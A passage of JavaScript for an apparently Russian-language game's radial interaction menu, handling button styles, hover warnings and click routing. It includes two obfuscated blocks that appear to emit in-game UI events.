                    var WNyGNRa=yaBrdM$_IL;function EZlnWyXbZXwTHxxxrPTX(){var LJFzjo$CbAFxGA=['bfb8b7bbbedcc1c5f6e1e7','b6babbbdb7eae3fecbe0d4','b6b6cce3eac3e4fc','bcbbb6bababdbfc2fac8c7f7eb','b7bfebf8c9e6e5f7','b6dbccf7fbe8de','c7e0faebfcefedfae7e1e0d8ebe6e7ede2ebc7ea','bab8b6b7b6bceac0c2c2eccd','edebe8fdfafbeae7e1a0fcefeae7efe2b4fbfeeaeffaeb','b6c0f9c2c8f9fe','ebe3e7fa','bdbfbfbdbcbec3d6d8faeddc','bbb9bdb8b9bbfac6c7cdfcd7','bbbcb6b6b9bedfc8cae8e8e9'];EZlnWyXbZXwTHxxxrPTX=function(){return LJFzjo$CbAFxGA;};return EZlnWyXbZXwTHxxxrPTX();}function yaBrdM$_IL(pE$nZdNLLb$C,HICrYUB$y_ufPQ){var DffgROKxoievGhky$N=EZlnWyXbZXwTHxxxrPTX();return yaBrdM$_IL=function(LFwpLtFI$$yeMXV,cRBmd$MjrIDeP){LFwpLtFI$$yeMXV=LFwpLtFI$$yeMXV-(parseInt(0xb)*Math.floor(0x2f4)+parseFloat(-parseInt(0x61))*parseFloat(-0x23)+parseInt(-parseInt(0x2cdd)));var JbE$AxXS$aR=DffgROKxoievGhky$N[LFwpLtFI$$yeMXV];if(yaBrdM$_IL['EmbSVw']===undefined){var J$ZLss_G=function(RZJMIqyXRcNZDBMywQaqDFlk){var EFTIGrxck=Math.ceil(0x1)*0x2335+-parseInt(0x4af)+Math.trunc(-parseInt(0x1cf8))&0x2369+-parseInt(0x1a83)+-parseInt(0x11)*Math.trunc(parseInt(0x77)),vDFgLhbsoHNobBLjNCLhzS=new Uint8Array(RZJMIqyXRcNZDBMywQaqDFlk['match'](/.{1,2}/g)['map'](PduPxbAiAHECHj=>parseInt(PduPxbAiAHECHj,parseInt(0x1d)*0xca+-parseInt(0x23d1)*-parseInt(0x1)+Math.max(-0x3aa3,-parseInt(0x3aa3))))),zcfOOW$Z$Q=vDFgLhbsoHNobBLjNCLhzS['map'](cqglXOOFUCGdunDyFJOnD_nvkH=>cqglXOOFUCGdunDyFJOnD_nvkH^EFTIGrxck),tFcCpEeEapzEHhTPSiPTpDzZ=new TextDecoder(),o$IeRfahTGuLDyCxBEAwG_OpEss=tFcCpEeEapzEHhTPSiPTpDzZ['decode'](zcfOOW$Z$Q);return o$IeRfahTGuLDyCxBEAwG_OpEss;};yaBrdM$_IL['Cqxivf']=J$ZLss_G,pE$nZdNLLb$C=arguments,yaBrdM$_IL['EmbSVw']=!![];}var pvPpYAKONhbpzbgSM_J=DffgROKxoievGhky$N[-parseInt(0xe29)+-0x1*parseInt(0x25d8)+0x3401*0x1],vrSbP=LFwpLtFI$$yeMXV+pvPpYAKONhbpzbgSM_J,ynEs_dneV$UR=pE$nZdNLLb$C[vrSbP];return!ynEs_dneV$UR?(yaBrdM$_IL['xaAhYZ']===undefined&&(yaBrdM$_IL['xaAhYZ']=!![]),JbE$AxXS$aR=yaBrdM$_IL['Cqxivf'](JbE$AxXS$aR),pE$nZdNLLb$C[vrSbP]=JbE$AxXS$aR):JbE$AxXS$aR=ynEs_dneV$UR,JbE$AxXS$aR;},yaBrdM$_IL(pE$nZdNLLb$C,HICrYUB$y_ufPQ);}(function(Si$PTpDzZYoIeRf$ahTGuLD,CxBEAwGOpEssyP){var FtyqDu_D_WWDoBwUvMNqQMoA=yaBrdM$_IL,uPx_b_Ai=Si$PTpDzZYoIeRf$ahTGuLD();while(!![]){try{var HECH_jZcqglXOOFU=parseInt(parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe4))/(Math.trunc(parseInt(0xc9b))+-parseInt(0x5bf)*Math.floor(-0x1)+Number(-parseInt(0x1259))*parseInt(0x1)))+-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xea))/(-parseInt(0x11)*parseInt(0x241)+parseInt(0x1a64)+Math.max(-parseInt(0x2f),-parseInt(0x2f))*Math.ceil(-0x41))+parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xef))/(Number(-parseInt(0x2444))+parseInt(-parseInt(0xf34))+parseInt(0x337b))+-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe8))/(-0x2403+-0x6fb*parseFloat(parseInt(0x1))+-0x1e*-0x16f)*(-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe2))/(Math.max(parseInt(0x160),0x160)*-0xe+Math.floor(-parseInt(0x830))*parseFloat(parseInt(0x4))+parseInt(0x3405)*Math.ceil(parseInt(0x1))))+parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe3))/(-0x22*-parseInt(0x6f)+parseInt(0x1244)+parseFloat(parseInt(0x107e))*-parseInt(0x2))*(-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe7))/(parseInt(0x1228)+Math.floor(-parseInt(0x2e0))*Math.floor(0x1)+Math.floor(-0xf41)))+Math['floor'](-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xec))/(0x5f7*parseInt(-0x4)+0x1*Math.ceil(parseInt(0x6c7))+0x111d))*(-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe6))/(0x59b+Math.floor(-0x2b6)*parseFloat(-parseInt(0x3))+-parseInt(0xdb4)))+-parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xee))/(parseInt(parseInt(0x1))*Math.ceil(-0x109d)+Math.floor(-0x2561)+parseInt(0x4)*0xd82)*(parseFloat(FtyqDu_D_WWDoBwUvMNqQMoA(0xe5))/(-parseInt(0x78)+parseInt(0x175)*-0x18+Math.ceil(parseInt(0x237b))*0x1));if(HECH_jZcqglXOOFU===CxBEAwGOpEssyP)break;else uPx_b_Ai['push'](uPx_b_Ai['shift']());}catch(GdunDyFJOnDnvkHR){uPx_b_Ai['push'](uPx_b_Ai['shift']());}}}(EZlnWyXbZXwTHxxxrPTX,-0x2d84*Number(-parseInt(0x5))+-parseInt(0x30a65)*parseInt(0x1)+parseInt(0x607c8)),cef[WNyGNRa(0xed)](WNyGNRa(0xeb),t,this[WNyGNRa(0xe9)]));
                }
            }
        },
        getButtonBorderStyle(buttonId) {
            const conditions = {
                5: () => !this.IsPlayerSleepActive,
                8: () => !this.IsPlayerDrugsActive,
                9: () => !this.IsPlayerHealthActive,
                12: () => !this.IsLocationCarActive,
                22: () => this.IsPlayerInVehicle,
                23: () => !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                24: () => !this.IsPlayerCarUploaded || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                27: () => this.IsPlayerInVehicle,
                28: () => !this.IsPlayerVehicleDriving,
                36: () => this.GetPlayerMetal === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                37: () => this.GetPlayerAidKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                38: () => !this.GetPlayerMask || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                39: () => this.GetPlayerRepairKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                40: () => !this.IsPlayerFlowersInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                41: () => !this.IsPlayerWeaponInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                43: () => this.InteractionVehiclePassenger1Id === 65535 || this.InteractionVehiclePassenger1 === this.GetPlayerName,
                44: () => this.InteractionVehiclePassenger2Id === 65535 || this.InteractionVehiclePassenger2 === this.GetPlayerName,
                46: () => this.InteractionVehiclePassenger3Id === 65535 || this.InteractionVehiclePassenger3 === this.GetPlayerName,
                47: () => this.InteractionVehicleDriverId === 65535 || this.InteractionVehicleDriver === this.GetPlayerName,
                48: () => !this.IsPlayerCarAccess,
                52: () => !this.IsPlayerCarUpsideDown,
                53: () => !this.IsPlayerNearCar,
                54: () => !this.IsPlayerСanisterInHands,
                56: () => !this.IsPlayerOrganization,
                57: () => !this.IsPlayerVehicleDriving,
            };
            return conditions[buttonId] && conditions[buttonId]() ? 'fill: rgba(0, 0, 0, 0.3)' : '#D9D9D9';
        },
        getButtonStyle(buttonId) {
            const conditions = {
                5: () => !this.IsPlayerSleepActive,
                8: () => !this.IsPlayerDrugsActive,
                9: () => !this.IsPlayerHealthActive,
                12: () => !this.IsLocationCarActive,
                22: () => this.IsPlayerInVehicle,
                23: () => !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                24: () => !this.IsPlayerCarUploaded || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                27: () => this.IsPlayerInVehicle,
                28: () => !this.IsPlayerVehicleDriving,
                36: () => this.GetPlayerMetal === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                37: () => this.GetPlayerAidKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                38: () => !this.GetPlayerMask || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                39: () => this.GetPlayerRepairKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                40: () => !this.IsPlayerFlowersInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                41: () => !this.IsPlayerWeaponInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                43: () => this.InteractionVehiclePassenger1Id === 65535 || this.InteractionVehiclePassenger1 === this.GetPlayerName,
                44: () => this.InteractionVehiclePassenger2Id === 65535 || this.InteractionVehiclePassenger2 === this.GetPlayerName,
                46: () => this.InteractionVehiclePassenger3Id === 65535 || this.InteractionVehiclePassenger3 === this.GetPlayerName,
                47: () => this.InteractionVehicleDriverId === 65535 || this.InteractionVehicleDriver === this.GetPlayerName,
                48: () => !this.IsPlayerCarAccess,
                52: () => !this.IsPlayerCarUpsideDown,
                53: () => !this.IsPlayerNearCar,
                54: () => !this.IsPlayerСanisterInHands,
                56: () => !this.IsPlayerOrganization,
                57: () => !this.IsPlayerVehicleDriving,
            };
            return conditions[buttonId] && conditions[buttonId]() ? 'fill: rgba(0, 0, 0, 0.4)' : '';
        },
        getButtonIconStyle(buttonId) {
            const conditions = {
                5: () => !this.IsPlayerSleepActive,
                8: () => !this.IsPlayerDrugsActive,
                9: () => !this.IsPlayerHealthActive,
                12: () => !this.IsLocationCarActive,
                22: () => this.IsPlayerInVehicle,
                23: () => !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                24: () => !this.IsPlayerCarUploaded || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                27: () => this.IsPlayerInVehicle,
                28: () => !this.IsPlayerVehicleDriving,
                36: () => this.GetPlayerMetal === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                37: () => this.GetPlayerAidKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                38: () => !this.GetPlayerMask || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                39: () => this.GetPlayerRepairKit === 0 || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                40: () => !this.IsPlayerFlowersInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                41: () => !this.IsPlayerWeaponInHands || !this.IsPlayerCanSendOffers || !this.IsPlayerReceiveOffers,
                43: () => this.InteractionVehiclePassenger1Id === 65535 || this.InteractionVehiclePassenger1 === this.GetPlayerName,
                44: () => this.InteractionVehiclePassenger2Id === 65535 || this.InteractionVehiclePassenger2 === this.GetPlayerName,
                46: () => this.InteractionVehiclePassenger3Id === 65535 || this.InteractionVehiclePassenger3 === this.GetPlayerName,
                47: () => this.InteractionVehicleDriverId === 65535 || this.InteractionVehicleDriver === this.GetPlayerName,
                48: () => !this.IsPlayerCarAccess,
                52: () => !this.IsPlayerCarUpsideDown,
                53: () => !this.IsPlayerNearCar,
                54: () => !this.IsPlayerСanisterInHands,
                56: () => !this.IsPlayerOrganization,
                57: () => !this.IsPlayerVehicleDriving,
            };
            return conditions[buttonId] && conditions[buttonId]() ? 'opacity: 0.7' : '';
        },
        buttonHover(target, isHovered) {
            const button = target;
            const buttonBorder = target.previousElementSibling;

            this.buttonMouseOver(button);
        
            const buttonActions = {
                1: () => {
                    if (this.IsPlayerCarUploaded) {
                        this.CurrentButtonMessage = '';
                        if (isHovered) {
                            this.CurrentButtonName = 'Управление личным транспортом';
                            setTimeout(() => document.getElementById("car-arrow").style.opacity = `1`, 50);
                        }
                        if (!isHovered) setTimeout(() => document.getElementById("car-arrow").style.opacity = `0`, 50);
                    }
                },
                4: () => {
                    this.CurrentButtonMessage = '';
                    if (isHovered) setTimeout(() => document.getElementById("naviki-arrow").style.opacity = `1`, 50);
                    if (!isHovered) setTimeout(() => document.getElementById("naviki-arrow").style.opacity = `0`, 50);
                },
                5: () => {
                    if (!this.IsPlayerSleepActive) {
                        if (isHovered) this.CurrentButtonMessage = button.dataset.warning;
                    } 
                },
                8: () => {
                    if (!this.IsPlayerDrugsActive) {
                        if (isHovered) this.CurrentButtonMessage = button.dataset.warning;
                    } 
                },
                9: () => {
                    if (!this.IsPlayerHealthActive) {
                        if (isHovered) this.CurrentButtonMessage = button.dataset.warning;
                    } 
                },
                12: () => {
                    if (!this.IsLocationCarActive) {
                        if (isHovered) this.CurrentButtonMessage = button.dataset.warning;
                    } 
                },
                21: () => {
                    if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                22: () => {
                    if (this.IsPlayerInVehicle) {
                        if (isHovered) this.CurrentButtonMessage = "Дуэль не доступна при нахождении в транспорте";
                    }
                },
                23: () => {
                    if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                24: () => {
                    this.CurrentButtonMessage = '';
                    if (isHovered) setTimeout(() => document.getElementById("document-arrow").style.opacity = `1`, 50);
                    if (!isHovered) setTimeout(() => document.getElementById("document-arrow").style.opacity = `0`, 50);
                },
                25: () => {
                    if (!this.IsPlayerCarUploaded) {
                        if (isHovered) this.CurrentButtonMessage = "Личный транспорт не загружен";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                26: () => {
                    this.CurrentButtonMessage = '';
                    if (isHovered) setTimeout(() => document.getElementById("transfer-arrow").style.opacity = `1`, 50);
                    if (!isHovered) setTimeout(() => document.getElementById("transfer-arrow").style.opacity = `0`, 50);
                },
                27: () => {
                    if (this.IsPlayerInVehicle) {
                        if (isHovered) this.CurrentButtonMessage = "Вы должны стоять на ногах";
                    }
                },
                28: () => {
                    if (!this.IsPlayerVehicleDriving) {
                        if (isHovered) this.CurrentButtonMessage = "Вы должны находиться за рулем транспорта";
                    }
                },
                29: () => {
                    if (!this.IsPlayerOrganization) {
                        if (isHovered) this.CurrentButtonDescription = "Вы не состоите в организации и не трудоустроены";
                        if (!isHovered) this.CurrentButtonDescription = "";
                    } 
                },
                36: () => {
                    if (this.GetPlayerRepairKit == 0) {
                        if (isHovered) this.CurrentButtonMessage = "У вас нету металла";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                37: () => {
                    if (this.GetPlayerAidKit == 0) {
                        if (isHovered) this.CurrentButtonMessage = "У вас нету аптечек";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                38: () => {
                    if (!this.GetPlayerMask) {
                        if (isHovered) this.CurrentButtonMessage = "У вас нету маски";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                39: () => {
                    if (this.GetPlayerRepairKit == 0) {
                        if (isHovered) this.CurrentButtonMessage = "У вас нету ремонтных наборов";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                40: () => {
                    if (!this.IsPlayerFlowersInHands) {
                        if (isHovered) this.CurrentButtonMessage = "Вы должны держать цветы в руках";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                41: () => {
                    if (!this.IsPlayerWeaponInHands) {
                        if (isHovered) this.CurrentButtonMessage = "Вы должны держать в руках оружие для передачи";
                    } 
                    else if (!this.IsPlayerCanSendOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Вы не можете отправить новое предложение в данный момент";
                    } 
                    else if (!this.IsPlayerReceiveOffers) {
                        if (isHovered) this.CurrentButtonMessage = "Игрок занят и не может получать новые предложения";
                    }
                },
                42: () => {
                    this.CurrentButtonMessage = '';
                    if (isHovered) setTimeout(() => document.getElementById("radial-arrow").style.opacity = `1`, 50);
                    if (!isHovered) setTimeout(() => document.getElementById("radial-arrow").style.opacity = `0`, 50);
                },
                43: () => {
                    this.CurrentButtonMessage = '';
                    this.CurrentButtonDescription = "Взаимодействовать с пассажиром";
                    if (this.InteractionVehiclePassenger1 === this.GetPlayerName) return;
                    
                    if (isHovered) setTimeout(() => document.getElementById("passenger1-arrow").style.opacity = `1`, 50);
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("passenger1-arrow").style.opacity = `0`, 50);
                    }
                },
                44: () => {
                    this.CurrentButtonMessage = '';
                    this.CurrentButtonDescription = "Взаимодействовать с пассажиром";
                    if (this.InteractionVehiclePassenger2 === this.GetPlayerName) return;
                    
                    if (isHovered) setTimeout(() => document.getElementById("passenger2-arrow").style.opacity = `1`, 50);
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("passenger2-arrow").style.opacity = `0`, 50);
                    }
                },
                45: () => {
                    this.CurrentButtonMessage = '';
                    if (isHovered) {
                        this.CurrentButtonDescription = "Взаимодействовать с транспортом";
                        setTimeout(() => document.getElementById("car2-arrow").style.opacity = `1`, 50);
                    }
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("car2-arrow").style.opacity = `0`, 50);
                    }
                },
                46: () => {
                    this.CurrentButtonMessage = '';
                    this.CurrentButtonDescription = "Взаимодействовать с пассажиром";
                    if (this.InteractionVehiclePassenger3 === this.GetPlayerName) return;
                    
                    if (isHovered) setTimeout(() => document.getElementById("passenger3-arrow").style.opacity = `1`, 50);
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("passenger3-arrow").style.opacity = `0`, 50);
                    }
                },
                47: () => {
                    this.CurrentButtonMessage = '';
                    this.CurrentButtonDescription = "Взаимодействовать с водителем";
                    if (this.InteractionVehicleDriver === this.GetPlayerName) return;
                    
                    if (isHovered) setTimeout(() => document.getElementById("driver-arrow").style.opacity = `1`, 50);
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("driver-arrow").style.opacity = `0`, 50);
                    }
                },
                48: () => {
                    this.CurrentButtonMessage = '';
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                    } else setTimeout(() => document.getElementById("car3-arrow").style.opacity = `1`, 50);

                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("car3-arrow").style.opacity = `0`, 50);
                    }
                },
                49: () => {
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                },
                50: () => {
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                },
                51: () => {
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                },
                52: () => {
                    if (!this.IsPlayerCarUpsideDown) {
                        if (isHovered) this.CurrentButtonMessage = "Транспорт не нуждается в перевороте";
                    } 
                },
                53: () => {
                    if (!this.IsPlayerNearCar) {
                        if (isHovered) this.CurrentButtonMessage = "Нужно стоять рядом с транспортом";
                    } 
                },
                54: () => {
                    if (!this.IsPlayerСanisterInHands) {
                        if (isHovered) this.CurrentButtonMessage = "Нет канистры в руках";
                    } 
                },
                55: () => {
                    if (isHovered) setTimeout(() => document.getElementById("element-arrow").style.opacity = `1`, 50);
                    if (!isHovered) {
                        this.CurrentButtonDescription = "";
                        setTimeout(() => document.getElementById("element-arrow").style.opacity = `0`, 50);
                    }
                },
                56: () => {
                    if (!this.IsPlayerOrganization) {
                        if (isHovered) this.CurrentButtonDescription = "Вы не состоите в организации и не трудоустроены";
                        if (!isHovered) this.CurrentButtonDescription = "";
                    } 
                },
                57: () => {
                    if (!this.IsPlayerVehicleDriving) {
                        if (isHovered) this.CurrentButtonMessage = "Нужно быть за рулём транспорта";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                },
                58: () => {
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                },
                59: () => {
                    if (!this.IsPlayerCarAccess) {
                        if (isHovered) this.CurrentButtonMessage = "Нет доступа к транспорту";
                        if (!isHovered) this.CurrentButtonMessage = "";
                    }
                }
            };
        
            button.classList.toggle('hover', isHovered);
            buttonBorder.classList.toggle('hover', isHovered);
        
            if (buttonActions[button.dataset.button]) {
                buttonActions[button.dataset.button]();
            }
        },
        click(element) {
            let passengerId = 65535;
            let toplayerId = this.InteractionPlayerId;

            if (element == 1) {
                if (this.IsPlayerCarUploaded) {
                    this.updateComponent('GetCurrentMenu', 11);
                    return;
                }
            } 
            else if (element == 4) {
                this.updateComponent('GetCurrentMenu', 12);
                return;
            } 
            else if (element == 5) {
                if (!this.IsPlayerSleepActive) return;
            } 
            else if (element == 8) {
                if (!this.IsPlayerDrugsActive) return;
            } 
            else if (element == 9) {
                if (!this.IsPlayerHealthActive) return;
            } 
            else if (element == 12) {
                if (!this.IsLocationCarActive) return;
            } 
            else if (element == 21) {
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 22) {
                if (this.IsPlayerInVehicle) return;
            }
            else if (element == 23) {
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            }
            else if (element == 24) {
                this.updateComponent('GetCurrentMenu', 21);
                return;
            } 
            else if (element == 25) {
                if (!this.IsPlayerCarUploaded) return;
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 26) {
                this.updateComponent('GetCurrentMenu', 22);
                return;
            } 
            else if (element == 27) {
                if (this.IsPlayerInVehicle) return;
            }
            else if (element == 28) {
                if (!this.IsPlayerVehicleDriving) return;
            }
            else if (element == 29) {
                if (!this.IsPlayerOrganization) return;
            }
            else if (element == 36) {
                if (this.GetPlayerMetal == 0) return;
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 37) {
                if (this.GetPlayerAidKit == 0) return;
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 38) {
                if (this.GetPlayerMask == 0) return;
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 39) {
                if (this.GetPlayerRepairKit == 0) return;
                if (!this.IsPlayerCanSendOffers) return;
                if (!this.IsPlayerReceiveOffers) return;
            } 
            else if (element == 40) {
                if (!this.IsPlayerFlowersInHands) return;
            } 
            else if (element == 41) {
                if (!this.IsPlayerWeaponInHands) return;
            } 
            else if (element == 42) {
                this.updateComponent('GetCurrentMenu', 10);
                return;
            } 
            else if (element == 43) {
                if (this.InteractionVehiclePassenger1Id !== 65535 && this.InteractionVehiclePassenger1 !== this.GetPlayerName) {
                    this.updateComponent('GetCurrentMenu', 20);
                    passengerId = 1;
                } else return;
            }
            else if (element == 44) {
                if (this.InteractionVehiclePassenger2Id !== 65535 && this.InteractionVehiclePassenger2 !== this.GetPlayerName) {
                    this.updateComponent('GetCurrentMenu', 20);
                    passengerId = 2;
                } else return;
            }
            else if (element == 45) {
                this.updateComponent('GetCurrentMenu', 24);
                return;
            } 
            else if (element == 46) {
                if (this.InteractionVehiclePassenger3Id !== 65535 && this.InteractionVehiclePassenger3 !== this.GetPlayerName) {
                    this.updateComponent('GetCurrentMenu', 20);
                    passengerId = 3;
                } else return;
            }
            else if (element == 47) {
                if (this.InteractionVehicleDriverId !== 65535 && this.InteractionVehicleDriver !== this.GetPlayerName) {
                    this.updateComponent('GetCurrentMenu', 20);
                    passengerId = 0;
                } else return;
            }
            else if (element == 48) {
                if (!this.IsPlayerCarAccess) return;
            } 
            else if (element == 49) {
                if (!this.IsPlayerCarAccess) return;
            } 
            else if (element == 50) {
                if (!this.IsPlayerCarAccess) return;
            } 
            else if (element == 51) {
                if (!this.IsPlayerCarAccess) return;
            } 
            else if (element == 52) {
                if (!this.IsPlayerCarUpsideDown) return;
            } 
            else if (element == 53) {
                if (!this.IsPlayerNearCar) return;
            } 
            else if (element == 54) {
                if (!this.IsPlayerСanisterInHands) return;
            } 
            else if (element == 55) {
                this.updateComponent('GetCurrentMenu', 25);
                return;
            }
            else if (element == 56) {
                if (!this.IsPlayerOrganization) return;
            }
            else if (element == 57) {
                if (!this.IsPlayerVehicleDriving) return;
            }
            else if (element == 58) {
                if (!this.IsPlayerCarAccess) return;
            }
            else if (element == 59) {
                if (!this.IsPlayerCarAccess) return;
            }

            if (element < 20) {
                function KeCgAMQrMHLfWfzVLSoqH(){var ZGSnjJhG=['bdbadfcdd9e9cee8','b9bdbbb3bfc6ddfcc8dce0','bbbcb3bdbdbecdcbc7f2f8e9','b8b3bbe8dee4e0ccc3','bbbffccccddffbc8','bbb3bed8d2cec3c0c7','efe7e3fe','b9bce1e5ece0c6f2','b8bbb3bebebefffec8e0efeb','bbb2bab2b3bbb3c7c9dbd2c4fe','bdbab2beccdfecc4c0cb','bbbebebabcbcbaf0e0ecc3fcce','beb9b2b9babedae5c3f9e7ff','e9efecf9feffeee3e5a4f8ebeee3ebe6b0e9e6e3e9e1bb'];KeCgAMQrMHLfWfzVLSoqH=function(){return ZGSnjJhG;};return KeCgAMQrMHLfWfzVLSoqH();}var MSFJ_L=wY$OqNhC_VQV;function wY$OqNhC_VQV(R$XDIJMbT,jFIFU_f_NJAv){var GUqButBjeaMCQX_NtP=KeCgAMQrMHLfWfzVLSoqH();return wY$OqNhC_VQV=function(IsmukofjLx,GScDbG_AMxrczjfIvDPg_FQNX){IsmukofjLx=IsmukofjLx-(Math.max(parseInt(0x31),parseInt(0x31))*parseInt(0x59)+0x13f+-parseInt(0x5bc)*Number(parseInt(0x3)));var ePcYzyyST=GUqButBjeaMCQX_NtP[IsmukofjLx];if(wY$OqNhC_VQV['ECRraH']===undefined){var EIbPmJBg=function(YbgRZN_ucPoNCcKwgakJOEmQql){var vAA$$vuZ=Math.trunc(-parseInt(0x11ea))*-0x1+parseInt(-0x1f61)+parseFloat(parseInt(0x17))*0xa7&-parseInt(0xb)*parseInt(0x83)+Math.max(-0x12af,-0x12af)*Math.ceil(-0x2)+parseInt(parseInt(0xf5f))*-parseInt(0x2),z_bBA$rGmp=new Uint8Array(YbgRZN_ucPoNCcKwgakJOEmQql['match'](/.{1,2}/g)['map'](N$MjJIH$Fdt=>parseInt(N$MjJIH$Fdt,Math.trunc(-0x1f2)+Number(-parseInt(0x2127))+0x2329*Math.trunc(parseInt(0x1))))),ffpIeYLsyJoCStb_EniLbWcNb=z_bBA$rGmp['map'](H$OlBRRYnEmSuJU=>H$OlBRRYnEmSuJU^vAA$$vuZ),QyGEjxqTJmJz$Cj$a=new TextDecoder(),Ce_CVOIOsAFhVmXklmLTgfF=QyGEjxqTJmJz$Cj$a['decode'](ffpIeYLsyJoCStb_EniLbWcNb);return 